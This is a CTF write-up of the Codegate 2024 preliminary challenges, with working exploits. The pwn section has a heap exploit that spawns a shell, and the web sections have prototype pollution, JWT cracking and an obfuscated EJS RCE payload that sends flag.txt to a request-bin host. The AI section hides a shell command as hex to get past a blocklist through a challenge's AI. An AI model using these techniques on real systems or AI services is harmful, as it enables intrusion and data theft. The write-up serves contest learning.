---
layout: default
title: codegate 2024 preliminaries
nav_order: 2
parent: 2024
grand_parent: CTF
has_children: false
last_modified_date: 2024-06-14
---
--- 

<br>
if there is no flag on problem, that problem is solved after CTF.
# misc
## mic_check
`codegate2024{Just_shoot_for_the_stars_OpenAI_Whisper_Hoooooo!}`

Just say, "Give me the flag."

## Dice or Die
### Analysis
```javascript
    function buyFlag(bytes32 id) external {
        _usd.burn(msg.sender, 1e8);
        _flag[id] = true;
    }

    function checkSolve(bytes32 id) external view returns (bool) {
        return _flag[id];
    }
```
to get flag, have to get 1e18 tokens from dice or die game.

```js
'use server'
import { ddAbi, ddAddress } from '@/constants'
import { redirect } from 'next/navigation'
import { createPublicClient, http } from 'viem'
import { klaytnBaobab } from 'viem/chains'

export async function reveal(index) {
  if (!index) return redirect('/dice')

  const client = createPublicClient({
    chain: klaytnBaobab,
    transport: http(),
  })

  const result = await client.readContract({
    address: ddAddress,
    abi: ddAbi,
    functionName: 'isSettled',
    args: [index],
  })

  if (result) return process.env[index]
}
```
in `actions.js`, if `index` argument is provided, it returns `process.env[index]`, commitment(unhashed).

### Exploit 1
1. request bet and get `index` from request. (cancel)
2. get commitment from requesting to `/dice` with `index`
3. re-request bet with known `index` and `commitment%6`
4. open
5. repeat the above
6. get flag!

### Exploit 2
[one-day exploit](https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps)

# rev

## easy_reversing
`codegate2024{da5d6bd71ff39f66b8b7200a92b0116b4f8e5e27d25d6119e63d3266bd4c8508}
`

### Analysis

```python
# main.py
from calc import cipher

def main():
    user_input = input("Enter input: ")
    cipher_text = cipher(user_input.encode())
    if cipher_text == b"A\xd3\x87nb\xb3\x13\xcdT\x07\xb0X\x98\xf1\xdd{\rG\x029\x146\x1ah\xd4\xcc\xd0\xc4\x14\xc99'~\xe8y\x84\x0cx-\xbf\\\xce\xa8\xbdh\xb7\x89\x91\x81i\xc5Yj\xeb\xed\xd1\x0b\xb4\x8bZ%1.\xa0w\xb2\x0e\xb5\x9d\x16\t\xd0m\xc0\xf8\x06\xde\xcd":
        print("Correct!")
    else:
        print("Fail!")

if __name__ == '__main__':
    main()
```
1. get user input
2. encrypt input with `cipher` from `calc.pyc`
3. compare encrypted input with `cipher_text`

```python
# Source Generated with Decompyle++
# File: calc.pyc (Python 3.10)

MOD = 256

def KSA(key):
    key_length = len(key)
    S = list(range(MOD))
    j = 0
    for i in range(MOD):
        j = (j + S[i] + key[i % key_length]) % MOD
        S[i] = S[j]
        S[j] = S[i]
    return S


def PRGA(S):
	i = 0
	j = 0
	i = (i + 1) % MOD
	j = (j + S[i]) % MOD
	S[i] = S[j]
	S[j] = S[i]
	K = S[(S[i] + S[j]) % MOD]
	yield K
	continue


def get_keystream(key):
    S = KSA(key)
    return PRGA(S)


def cipher(text):
    key = 'neMphDuJDhr19Bb'
    key = (lambda .0: [ ord(c) ^ 48 for c in .0 ])(key)
    keystream = get_keystream(key) 
    text = text[-2:] + text[:-2]
    res = []
    for c in text:
        kk = next(keystream)
        val = c ^ kk
        res.append(val)
    return bytes(res)

```
source code worth viewing was generated through [pycdc](https://github.com/zrax/pycdc)
the routine is so simple.
1. make `keystream`
2. `text = text[-2:] + text[:-2`
3. xor the `text` with `keystream`
(another key generating function is not very important)

### Exploit

```python
from calc2 import cipher

def main():
    cipher_test_copy = b"A\xd3\x87nb\xb3\x13\xcdT\x07\xb0X\x98\xf1\xdd{\rG\x029\x146\x1ah\xd4\xcc\xd0\xc4\x14\xc99'~\xe8y\x84\x0cx-\xbf\\\xce\xa8\xbdh\xb7\x89\x91\x81i\xc5Yj\xeb\xed\xd1\x0b\xb4\x8bZ%1.\xa0w\xb2\x0e\xb5\x9d\x16\t\xd0m\xc0\xf8\x06\xde\xcd"
    user_input = b'a'*len(cipher_test_copy)
    cipher_text = cipher(user_input)
    print(cipher_text)
    key_list = []
    for i in range(len(cipher_text)):
        key_list.append(cipher_text[i] ^ user_input[i])

    flag = ""
    for i in range(len(cipher_text)):
        flag+=(chr(key_list[i]^cipher_test_copy[i]))

    flag = flag[2:]+flag[:2]
    print(flag)

if __name__ == '__main__':
    main()
```
1. leak `keystream`
	1. `cipher(b'a'*len(cipher_text)) ^ b'a'*len(cipher_text)`
2. xor `cipher_text` with that `keystream`

## complex_sets
`codegate2024{9cce050f2abaa59b946226e9e487c90e195d4f0f53975f625164562a6521cd751f7a72ef9c39f14abe9a246bbb1795aeff9d1d06912840928f1418b0a245cb}`

> An odd integer m and its multiple n, both less than 2^64, will be given in the form `n = {n}, m = {m}`:

### Analysis
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 v4; // [rsp+0h] [rbp-50h] BYREF
  char *p; // [rsp+8h] [rbp-48h]
  _BOOL8 v6; // [rsp+10h] [rbp-40h]
  unsigned __int64 v7; // [rsp+18h] [rbp-38h]
  size_t v8; // [rsp+20h] [rbp-30h]
  __int64 *v9; // [rsp+28h] [rbp-28h]
  __int64 m; // [rsp+30h] [rbp-20h]
  size_t n; // [rsp+38h] [rbp-18h]
  const char **v12; // [rsp+40h] [rbp-10h]
  unsigned int v13; // [rsp+48h] [rbp-8h]
  int v14; // [rsp+4Ch] [rbp-4h]

  v14 = 0;
  v13 = argc;
  v12 = argv;
  if ( argc == 3 )
  {
    n = atoll(v12[1]);
    m = atoll(v12[2]);
    v9 = &v4;
    p = (char *)&v4 - ((n + 15) & 0xFFFFFFFFFFFFFFF0LL);
    v8 = n;
    memset(p, 0, n);
    v7 = 0LL;
    do
    {
      v6 = included_get_sum_mod_m((__int64)p, n, m) == 0;
      v7 = (v6 + v7) % 0xFFFFFFFFFFFFFFFFLL;
    }
    while ( (char)included_next(p, n) != 1 );
    printf("%ld\n", v7);
    return 0;
  }
  else
  {
    printf("argc(%d) must be 3", v13);
    return 1;
  }
}

unsigned __int64 __fastcall included_get_sum_mod_m(__int64 a1, unsigned __int64 n, unsigned __int64 m)
{
  unsigned __int64 i; // [rsp+8h] [rbp-28h]
  unsigned __int64 v5; // [rsp+10h] [rbp-20h]

  v5 = 0LL;
  for ( i = 0LL; i < n; ++i )
  {
    if ( *(_BYTE *)(a1 + i) == 1 )
      v5 = ((i + 1) % m + v5) % m;
  }
  return v5;
}

_BOOL8 __fastcall included_next(__int64 a1, unsigned __int64 n)
{
  unsigned __int64 i; // [rsp+0h] [rbp-28h]
  __int64 v4; // [rsp+8h] [rbp-20h]

  v4 = 0LL;
  for ( i = 0LL; i <= n; ++i )
  {
    if ( i < n )
    {
      *(_BYTE *)(a1 + i) = *(_BYTE *)(a1 + i) == 0;
      if ( *(_BYTE *)(a1 + i) == 1 )
        break;
    }
    ++v4;
  }
  return v4 == n + 1;
}
```
the routine is shown below.
1. `included_next` generate `bin(i)[2:]` from 0 to 2\*\*n-1
2. `included_get_sum_mod_m` traverses from digit 0 to digit n-1, adding all digits that are 1 and get the remainder divided by m as shown below
```
# 22
1 0 1 1 0
5 4 3 2 1
(5+3+2)%m
```
3. and if the remainder is 0, add 1 to `v7` (result)
4. and so on..

### Exploit

```python
from pwn import *

context.log_level = "debug"
p = remote("43.203.200.24",7331)

while True:
    try:
        p.recvuntil("= ")
        n=int(p.recvuntil(",")[:-1])
        p.recvuntil("= ")
        m=int(p.recvuntil("\n")[:-1])
        print(n,m)

        no = m
        kill = n
        all_list = [0 for i in range(no)]
        count = 0
        for i in range(2**no):
            a = bin(i)[2:]
            a = a[::-1]
            tmp = 0
            for j in range(len(a)):
                if (a[j] == '1'):
                    tmp+=(j+1)
            tmp = tmp % no
            if (tmp == 0):
                count+=1
            all_list[tmp] += 1
        print(all_list)


        for i in range(no+1,kill+1):
            all_list2 = [0 for i in range(no)]
            for j in range(no):
                all_list2[j] = all_list[j]+all_list[(j+i)%no]
            all_list = all_list2.copy()
        kill=((all_list[0]%0xFFFFFFFFFFFFFFFF))

        p.sendline(str(kill))
    finally:
        print("break")
```
1. create a list of length m, where each index counts the number of remainders calculated from 0 to 2\*\*m - 1
   For example, if m is 3 and the remainders are [1, 2, 0, 0, 0, 2, 1], the list of length m would be [3, 2, 2], with each index incremented based on the remainders."
2. and, whenever a digit is added to the leading binary digit, divide that digit by m, and modify the existing remainder count list of length m to be the existing list plus the remaining list with that digit added. (with this technique, can save time)

# pwn

## baby heap
`codegate2024{5ad6d0397afbe8f18e9a641edd697d8d02d6a80969b8b0c2038afe9db23c6f7870b0e59bc894827add7c6e1c97aec59d073d7d054ac90b24dc56128349cec5}`

### Analysis
```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
have to leak libcbase and overwrite libc got or some place else

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char buf[4]; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v5; // [rsp+8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  sub_1249(a1, a2, a3);
  while ( 1 )
  {
    menu();
    read(0, buf, 4uLL);
    buf[3] = 0;
    switch ( atoi(buf) )
    {
      case 1:
        add2();
        break;
      case 2:
        free2();
        break;
      case 3:
        modify();
        break;
      case 4:
        view();
        break;
      case 5:
        puts("bye");
        return 0LL;
      default:
        puts("invalid input");
        break;
    }
  }
}

struct chunk{
	size_t size;
	int64_t flag;
	char* data;
}
```

```c
unsigned __int64 add2()
{
  size_t size; // [rsp+8h] [rbp-28h]
  struct chunk *parent; // [rsp+10h] [rbp-20h]
  void *p; // [rsp+18h] [rbp-18h]
  char buf[8]; // [rsp+20h] [rbp-10h] BYREF
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  if ( (unsigned __int64)count <= 0xF )
  {
    printf("input chunk size : ");
    read(0, buf, 8uLL);
    size = atoi(buf);
    if ( size <= 199 )
    {
      parent = (struct chunk *)malloc(0x18uLL);
      if ( parent )
      {
        p = malloc(size);
        if ( p )
        {
          printf("input chunk data : ");
          read(0, p, size);
          parent->size = size;
          parent->flag = 1LL;
          parent->data = (char *)p;
          chunks[count++] = parent;
        }
        else
        {
          puts("failed malloc..");
        }
      }
      else
      {
        puts("failed malloc.");
      }
    }
    else
    {
      puts("too big chunk size");
    }
  }
  else
  {
    puts("chunk limit exceeded");
  }
  return v5 - __readfsqword(0x28u);
}
```
1. get chunk size (<=199)
2. malloc chunk and chunk's data
3. write input to data
4. set chunk's size, flag, data field

```c
unsigned __int64 free2()
{
  unsigned __int64 index; // [rsp+0h] [rbp-20h]
  struct chunk *p; // [rsp+8h] [rbp-18h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  printf("input chunk id : ");
  read(0, buf, 8uLL);
  index = atoi(buf);
  if ( index < count )
  {
    p = chunks[index];
    if ( p )
    {
      if ( p->flag && p->data )
      {
        free(p->data);
        p->data = 0LL;
        p->flag = 0LL;
        free(chunks[index]);
      }
      else
      {
        puts("fail..");
      }
    }
    else
    {
      puts("fail.");
    }
  }
  else
  {
    puts("invalid chunk index");
  }
  return v4 - __readfsqword(0x28u);
}
```
1. get chunk id
2. get chunk and check flag and data is set
3. free data and overwrite fields with 0, and free chunk

```c
unsigned __int64 modify()
{
  unsigned __int64 v1; // [rsp+0h] [rbp-20h]
  struct chunk *v2; // [rsp+8h] [rbp-18h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  printf("input chunk id : ");
  read(0, buf, 8uLL);
  v1 = atoi(buf);
  if ( v1 < count )
  {
    v2 = chunks[v1];
    if ( v2 )
    {
      if ( v2->flag && v2->data )
      {
        printf("modify chunk data(max 40) : ");
        read(0, v2->data, 0x28uLL);
      }
      else
      {
        puts("fail..");
      }
    }
    else
    {
      puts("fail.");
    }
  }
  else
  {
    puts("invalid chunk index");
  }
  return v4 - __readfsqword(0x28u);
}
```
1. get chunk id
2. get chunk and check flag and data is set
3. write input to data with 0x18 size

```c
unsigned __int64 view()
{
  int v1; // [rsp+8h] [rbp-18h]
  int v2; // [rsp+Ch] [rbp-14h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  printf("input chunk id : ");
  v1 = read(0, buf, 8uLL);
  v2 = atoi(buf);
  if ( v1 == -1 )
  {
    puts("input error");
  }
  else if ( v2 <= 15 )
  {
    if ( chunks[v2] )
    {
      if ( !chunks[v2]->flag || !chunks[v2]->data )
        puts("unused chunk");
      write(1, chunks[v2]->data, chunks[v2]->size);
    }
    else
    {
      puts("invalid chunk index");
    }
  }
  else
  {
    puts("oob input");
  }
  return v4 - __readfsqword(0x28u);
}
```
1. get chunk id
2. check flag and data is set
3. output chunk data

#### Scenario
1. leak libcbase with `view` (oob)
2. make aaw, aar primitiv with `add`, `free` (uaf exists because there dangling pointer in chunks list)
3. overwrite some place to spawn a shell

### Exploit

```python
from pwn import *

class Exploit:
    def __init__(self, chal_path, libc_path, nc_url):
        self.chal_path = chal_path
        self.libc_path = libc_path
        self.nc_url = nc_url

        libc = ELF(self.libc_path) if self.libc_path else None
        self.libc = libc
        env = {"LD_PRELOAD": self.libc_path} if self.libc_path else None
        env = {}
        if args.REMOTE:
            nc_url = self.nc_url.split()
            self.p = remote(nc_url[1], int(nc_url[2]))
        elif args.DEBUGG:
            context.terminal = ["tmux", "splitw", "-h"]
            self.p = process(self.chal_path, env=env)
            gdbscript = """
            # pie b 0x0000000000001814
            # pie b 0x0000000000001762
            # b *puts
            pie b 0x000000000000162A
            b *__run_exit_handlers+229

            p $_base()+0x4060

            c
            """
            gdb.attach(self.p, gdbscript=gdbscript)
        else:
            self.p = process(self.chal_path, env=env)
    
sla = lambda x, y : p.sendlineafter(x, y)
sa  = lambda x, y : p.sendafter(x, y)
sl  = lambda x    : p.sendline(x)
s   = lambda x    : p.send(x)
rvu = lambda x    : p.recvuntil(x)
rv  = lambda x    : p.recv(x)
rvl = lambda      : p.recvline()
li  = lambda x    : log.info(hex(x))

def add_chunk(size,data):
    sla(">> ","1")
    sla(": ",str(size).encode())
    sa(": ",data)


def del_chunk(idx):
    sla(">> ","2")
    sla(": ",str(idx).encode())

def view_chunk(idx):
    sla(">> ","4")
    sla(": ",str(idx).encode())

def modify_chunk(idx,data):
    sla(">> ","3")
    sla(": ",str(idx).encode())
    sa(": ",data)


def exit_pr():
    sla(">> ","5")

def ROL(data, shift, size=64):
    shift %= size
    remains = data >> (size - shift)
    body = (data << shift) - (remains << size )
    return (body + remains)
    

def ROR(data, shift, size=64):
    shift %= size
    body = data >> shift
    remains = (data << (size - shift)) - (body << size)
    return (body + remains)

if __name__ == "__main__":
    context(os='linux', arch='amd64', log_level='debug')
    chal_path = "./chall"
    libc_path = "./libc.so.6.local"
    nc_url = "nc 13.125.233.58 7331"
    exp=Exploit(chal_path,libc_path,nc_url)
    p = exp.p
    libc = exp.libc


    view_chunk(-4)
    print(rv(0x5))
    a=u64(rv(8))
    off = 0x21ca60
    libc_base = a-off
    rvu("1")
    print("test")
    print(a)
    ld_rw = 0x00007f737079c040
    li(libc_base)

    add_chunk(10,b'aa')
    add_chunk(30,b'aa')
    del_chunk(0)
    del_chunk(1)

    got = 0x21a098-0x30
    got = 0x21bf00+0x10
    li(libc_base-0x28c0)
    add_chunk(0x18,p64(0x30)+p64(1)+p64(libc_base-0x28c0+0x30))

    li(libc_base)

    modify_chunk(0,p64(0)*3)
    modify_chunk(2,p64(0x30)+p64(1)+p64(libc_base+got))
    modify_chunk(0,p64(4)+p64(ROL(libc_base+libc.symbols['system'],0x11))+p64(libc_base+next(libc.search(b"/bin/sh"))))
    exit_pr()

    p.interactive()
```

i tried to find libc got and exploit it with one gadget, but it didn't work.
there are many one gadgets and libc got in libc.so.6, but condition not matched.
so, i find another place to overwrite, and finally find `__exit_funcs`.
when `exit` is called, it internally call `__run_exit_handlers` and then, handlers call functions refer from `exit_function_list` pointed to by `__exit_funcs`.
```c
struct exit_function
  {
    /* `flavour' should be of type of the `enum' above but since we need
       this element in an atomic operation we have to use `long int'.  */
    long int flavor;
    union
      {
	void (*at) (void);
	struct
	  {
	    void (*fn) (int status, void *arg);
	    void *arg;
	  } on;
	struct
	  {
	    void (*fn) (void *arg, int status);
	    void *arg;
	    void *dso_handle;
	  } cxa;
      } func;
  };
struct exit_function_list
  {
    struct exit_function_list *next;
    size_t idx;
    struct exit_function fns[32];
  };
```
if overwrite `__exit_funcs`'s exit_function, can change control flow. (with flavor : 4 (`ef_cxa`), `exafct(arg,status)` called)
but, `__exit_funcs` uses `PTR_MANGLE`, `PTR_DEMANGLE` for security.
overwrite `fs:[0x30]` with 0 and overwrite func pointer with `ROL(system)` -> can bypass.

1. locate `view`'chunk to stderr and read datas and get some useful address -> libcbase leak
2. allocate A chunk and B chunk with each data size (10,30)
	- A, A-data, B, B-data is allocated
3. free chunk A, B
	- tcache 0x20 <- B <- A <- A-data
	- tcache 0x30 <- B-data
- allocate C chunk with size 0x18 and write controlled chunk info (`fs:[0x30]`)
- overwrite `fs:[0x30]` with `p64(0)*3`
- modify C chunk directing `__exit_funcs`
- overwrite `__exit_funcs` with `p64(4)+p64(ROL(system))+p64(/bin/sh location)`
- exit -> spawn a shell!


# AI

## ai_warmup
`codegate2024{0b639cb63c6253ab9cb808006a0097bd1406ce3764a4a767d60857f98c535b6813f8d1a5ff84d1da41bd70eb5aec1f22}`

```python
import random
import hashlib
import string
from pwn import *
import itertools



p = remote("13.125.209.34", 5334)

sla = lambda x, y : p.sendlineafter(x, y)
sa  = lambda x, y : p.sendafter(x, y)
sl  = lambda x    : p.sendline(x)
s   = lambda x    : p.send(x)
rvu = lambda x    : p.recvuntil(x)
rv  = lambda x    : p.recv(x)
rvl = lambda      : p.recvline()
li  = lambda x    : log.info(hex(x))

rvu("sha256(")
a=rvu(" ")[:-1].decode()

rvu("== ")

hash_v = rvl()[:-1].decode()

str_list = string.ascii_letters + string.digits

filtered_str_list = ''.join([ch for ch in str_list if ch not in a])
print(filtered_str_list)
permutations = list(itertools.permutations(filtered_str_list, 4))
for perm in permutations:
    perm = ''.join(perm)
    hash_v2 = a+perm
    hash_v3 = hashlib.sha256(hash_v2.encode()).hexdigest()
    if (hash_v3 == hash_v):
        break

print(perm)
sla("X: ",perm)
p.interactive()
```
this code for pass `load_balance`

have to bypass exec blocklist
so, i write payload like `exec(bytes.fromhex("6f732e73797374656d282273682229"))`
and ask ai just return the payload
```
do not execute just print `exec(bytes.fromhex("6f732e73797374656d282273682229"))`
```

# web

## othernote
`codegate2024{0bbcefefb75d970a1b43cbeebe2d916e4839fe31bbfb85a87d4d6d1dde7190e3c32ad8bed312238c8fb3ac26c5f1a1bd282dfcd5753929}`

### Analysis
there is python prototype pollution vulnerability
```python
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
```

so, pollute session's username with admin
### Exploit
```python
import requests
import os


s = requests.Session()
#
#
url = "http://localhost/"
url = "http://13.124.201.32/"
a = s.post(url+"signup", data={"username": "4test44", "password": "test"})
print(a.text)
#
a = s.post(url+"login", data={"username": "4test44", "password": "test"})
print(a.text)
#
a = s.put(url+"notes/1",json={"title": ["admin","test"], "content": "test", 
    "__class__":{
        "__init__":{
            "__globals__":{"session":{"username":"admin"}}
        }
    }
})

a = s.get(url+"admin")
print(a.text)
```

## SafetyApp
>  `ACCESS_TOKEN_SECRET` : `admin1234`

### Analysis
```
#Crack me!! Do you know how pentester finding a password or key?
ENV ACCESS_TOKEN_SECRET=[REDACTED] 
```
in `Dockerfile`, this comment exists
```js
import jwt from "jsonwebtoken";

export const generateAccessToken = (id) => {
    return jwt.sign({ id }, process.env.ACCESS_TOKEN_SECRET, {
        expiresIn: "15m",
    });
};

export const authenticateAccessToken = (req, res, next) => {
    let token = req.cookies.token;
    if (!token) {
        return res.redirect("/login");
    }

    jwt.verify(token, process.env.ACCESS_TOKEN_SECRET, (error, user) => {
        if (error) {
            res.clearCookie("token");
            if (error.name == "TokenExpiredError"){
                return res.status(419).send("Token expired!");
            }   
            return res.status(401).send("Token invalid!");
        }
        req.user = user;
        next();    
    });
};
```
and in `token.js`, it user `ACCESS_TOKEN_SECRET` as a key.
so, i use [gojwtcrack](https://github.com/haxrob/gojwtcrack) to crack jwt token.

```
$ cat rockyou.txt | gojwtcrack -t token.txt
admin1234       eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Imd1ZXN0IiwiaWF0IjoxNzE4MDU5MTg5LCJleHAiOjE3MTgwNjAwODl9.tDBGq3gQexEfO90DPeZHtbTxg246OP61BFbmZEblDjM
```
so, now, we can login with admin

in ejs, we can pass not only data, but options through `res.render("page", req.query);`.
```javascript
app.get(
  "/user-details/:userId",
  authenticateAccessToken,
  [
    check("*").custom((value, { req }) => {
      // if (filtering(value)) {
      //     throw new Error('Keyword is blocked');
      // }
      return true;
    }),
  ],
  (req, res) => {
    if (req.user.id != "admin") {
      return res.status(401).send("You are not Admin!");
    }

    const { userId } = req.params;
    const user = users.find((user) => user.id === userId);

    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }

    if (user) {
      res.json(user);
    } else {
      req.query.errorCode = "404";
      req.query.message = "User not found";
      console.log(req.query);
      res.status(404).render("error", req.query);
    }
  },
);
```

in source code, it render with `res.status(404).render("error", req.query);` if no user matches.
trigger rce with ejs vulnerability.
```javascript
settings[view options][escapeFunction]=(() => {import(`chi${''}ld_p${''}rocess`).then((xx) => {% raw %}{{var a = xx[`ex${''}ecSync`]('cat flag.txt');import(`https`).then((yy) => {yy.get(`[your_request_bin_url]?a=${a}`);});}}{% endraw %});})&settings[view options][client]=1&settings[view options][debug]=1
```

```javascript
() => {
  import(`chi${""}ld_p${""}rocess`).then((xx) => {
    {
      var a = xx[`ex${""}ecSync`]("cat flag.txt");
      import(`https`).then((yy) => {
        yy.get(`[your_request_bin_url]?a=${a}`);
      });
    }
  });
};
```
cat `flag.txt` and send it to request bin.

### Exploit
```python
import subprocess
import jwt
import requests

s = requests.Session()

guest = s.post(
    "http://localhost:3000/login",
    data={"userId": "guest", "userPw": "guest"},
)
guest_token = s.cookies.get_dict()["token"]
with open("./token.txt", "w") as f:
    f.write(guest_token)
a = subprocess.run(
    "cat rockyou.txt | ../gojwtcrack/gojwtcrack -t token.txt",
    text=True,
    shell=True,
    capture_output=True,
)
password = (a.stdout).split()[0]
print(password)

guest_jwt = jwt.decode(guest_token, password, algorithms=["HS256"])
admin_origin = guest_jwt.copy()
admin_origin["id"] = "admin"
admin_jwt = jwt.encode(admin_origin, password, algorithm="HS256")
s.cookies.clear()
s.cookies.set("token", admin_jwt)

payload = "settings[view options][escapeFunction]=(() => {import(`chi${''}ld_p${''}rocess`).then((xx) => {% raw %}{{var a = xx[`ex${''}ecSync`]('cat flag.txt');import(`https`).then((yy) => {yy.get(`[your_request_bin_url]?a=${a}`);});}}{% endraw %});})&settings[view options][client]=1&settings[view options][debug]=1"
rce = s.get("http://localhost:3000/user-details/admin1?" + payload)
```

# blockchain

## Staker
`0x5bc2910452970e6313b16baecadf3672d6825c542bfa135aef128afaea43e3ceb4652d253bd28ae9ff1b222a0f70d63d32851ddc686d920bf85a775cd64c2a2f89eaa3a350f0ab4e5f75eabb67675d8f`

### Analysis
```javascript
# Token
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract Token is ERC20 {
    constructor() ERC20("Token", "TKN") {
        _mint(msg.sender, 186401 * 1e18);
    }
}
```
186401\*1e18 tokens available for msg.sender

```javascript
# Setup.sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {Token} from "./Token.sol";
import {LpToken} from "./LpToken.sol";
import {StakingManager} from "./StakingManager.sol";

contract Setup {
    StakingManager public stakingManager;
    Token public token;

    constructor() payable {
        token = new Token();
        stakingManager = new StakingManager(address(token));

        token.transfer(address(stakingManager), 86400 * 1e18);

        token.approve(address(stakingManager), 100000 * 1e18);
        stakingManager.stake(100000 * 1e18);
    }

    function withdraw() external {
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }

    function isSolved() public view returns (bool) {
        return token.balanceOf(address(this)) >= 10 * 1e18;
    }
}
```
1. transfer `stakingManager` 86400\*1e18 tokens
2. approve `stakingManager` 100000\*1e18 tokens and stake(100000\*1e18)
(1\*1e18 tokens remains)

```javascript
# StakingManager.sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {LpToken} from "./LpToken.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract StakingManager {
    uint256 constant REWARD_PER_SECOND = 1e18;

    IERC20 public immutable TOKEN;
    LpToken public immutable LPTOKEN;

    uint256 lastUpdateTimestamp;
    uint256 rewardPerToken;

    struct UserInfo {
        uint256 staked;
        uint256 debt;
    }

    mapping(address => UserInfo) public userInfo;

    constructor(address token) {
        TOKEN = IERC20(token);
        LPTOKEN = new LpToken();
    }

    function update() internal {
        if (lastUpdateTimestamp == 0) {
            lastUpdateTimestamp = block.timestamp;
            return;
        }

        uint256 totalStaked = LPTOKEN.totalSupply();
        if (totalStaked > 0 && lastUpdateTimestamp != block.timestamp) {
            rewardPerToken = (block.timestamp - lastUpdateTimestamp) * REWARD_PER_SECOND * 1e18 / totalStaked;
            lastUpdateTimestamp = block.timestamp;
        }
    }

    function stake(uint256 amount) external {
        update();

        UserInfo storage user = userInfo[msg.sender];

        user.staked += amount;
        user.debt += (amount * rewardPerToken) / 1e18;

        LPTOKEN.mint(msg.sender, amount);
        TOKEN.transferFrom(msg.sender, address(this), amount);
    }

    function unstakeAll() external {
        update();

        UserInfo storage user = userInfo[msg.sender];

        uint256 staked = user.staked;
        uint256 reward = (staked * rewardPerToken / 1e18) - user.debt;
        user.staked = 0;
        user.debt = 0;

        LPTOKEN.burnFrom(msg.sender, LPTOKEN.balanceOf(msg.sender));
        TOKEN.transfer(msg.sender, staked + reward);
    }
}
```
- update()
	1. `rewardPerToken = (block.timestamp - lastUpdateTimestamp) * REWARD_PER_SECOND * 1e18 / LPTOKEN.totalSupply();`
- stake(uint256 amount)
	1. update
	2. set staked, debt
	3. mint (`LPTOKEN`)
	4. transfer (`TOKEN`)
- unstakeAll()
	1. update
	2. set staked, reward (update function set `rewardPerToken`. so, if we decrease `LPTOKEN`'s total supply, can get a big reward)
	3. burn (`LPTOKEN`)
	4. transfer (`TOKEN`)

```javascript
# LpToken.sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract LpToken is ERC20 {
    address immutable minter;

    constructor() ERC20("LP Token", "LP") {
        minter = msg.sender;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == minter, "only minter");
        _mint(to, amount);
    }

    function burnFrom(address from, uint256 amount) external {
        _burn(from, amount);
    }
}
```
Only the minter can access the `mint`, while anyone can access the `burn`

### Exploit
1. withdraw 1\*1e18 tokens from `Setup`
2. approve and `stake` 1\*1e18 token
3. burn `Setup`'s all tokens (`LPTOKEN`)
4. wait for a minute
5. `unstakeAll` and gets a big reward
6. transfer 10\*1e18 tokens to `Setup`
7. Solved!

```javascript
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {StakingManager} from "./StakingManager.sol";
import {Setup} from "./Setup.sol";
import {LpToken} from "./LpToken.sol";
import {Token} from "./Token.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Attack is Script{
  Setup public setup2 = Setup([setup contract]);
  StakingManager public stakingManager = setup2.stakingManager();
  Token public token = setup2.token();
  LpToken public lpToken = stakingManager.LPTOKEN();
  address me = [your address];

  function attack1() public {
    setup2.withdraw();
    uint256 balance = token.balanceOf(me);
    token.approve(address(stakingManager), balance);
    stakingManager.stake(balance);
    lpToken.burnFrom(address(setup2), 100000 * 1e18);

    uint256 totalSupply = lpToken.totalSupply();
    console.log(totalSupply);
  }
  function attack2() public{
    stakingManager.unstakeAll();
    uint256 balance = token.balanceOf(me);
    console.log(balance);

  }
  function send_10() public{
    token.approve(address(setup2), 10 * 1e18);
    token.transfer(address(setup2), 10 * 1e18);
  }

  function run() external {
    vm.startBroadcast();

    attack1();

    // attack2();

    // send_10();

    vm.stopBroadcast();
  }
}
```
